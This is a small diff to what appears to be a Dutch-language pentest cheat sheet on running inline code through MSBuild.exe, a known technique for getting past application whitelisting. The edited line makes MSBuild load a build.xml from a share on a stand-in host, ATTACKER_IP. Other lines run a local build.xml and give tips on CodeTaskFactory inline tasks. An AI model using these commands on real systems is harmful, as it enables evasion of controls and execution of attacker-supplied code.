@@ -6,6 +6,6 @@ C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe C:\Windows\tasks\bui
 # 32-bit variant:
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe C:\Windows\tasks\build.xml
 # Remote XML laden (niet altijd mogelijk):
-C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe \\10.0.0.1\share\build.xml
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe \\ATTACKER_IP\share\build.xml
 # Tip: Inline task moet <UsingTask> met TaskFactory="CodeTaskFactory" bevatten
 # Tip: AssemblyFile="Microsoft.Build.Tasks.v4.0.dll" voor .NET referenties
